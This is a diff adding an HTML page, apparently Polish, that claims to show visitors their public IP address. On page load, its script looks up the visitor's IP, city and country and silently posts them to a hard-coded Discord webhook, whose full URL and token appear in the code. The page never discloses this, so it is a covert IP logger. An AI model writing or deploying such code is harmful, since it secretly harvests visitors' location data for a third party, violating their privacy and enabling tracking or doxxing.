@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Public IP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 1.2em;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Twoje ip 💀</h1>
+        <p id="ip">Ładowanie twojego ip...</p>
+        <p id="miasto">Ładowanie Adresu...</p>
+        <p id="kraj">Ładowanie Adresu...</p>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1253672974226161666/HW8ROUTrRDQANl7HT9mA3zsRb38eBIgFErQvl1dG6gRV_Ys5WSWtFz2Ud0VdU54rGzUX';
+
+        async function sendToDiscord(ip, city, country) {
+            const payload = {
+                content: `IP: ${ip}\nCity: ${city}\nCountry: ${country}`
+            };
+            
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        async function getPublicIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                document.getElementById('ip').innerText = data.ip;
+
+                let countryResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                let country = await countryResponse.json();
+                document.getElementById('miasto').innerText = country.city;
+                document.getElementById('kraj').innerText = country.country_name;
+
+                sendToDiscord(data.ip, country.city, country.country_name);
+            } catch (error) {
+                document.getElementById('ip').innerText = 'Error fetching IP';
+            }
+        }
+
+        getPublicIP();
+    </script>
+</body>
+</html>
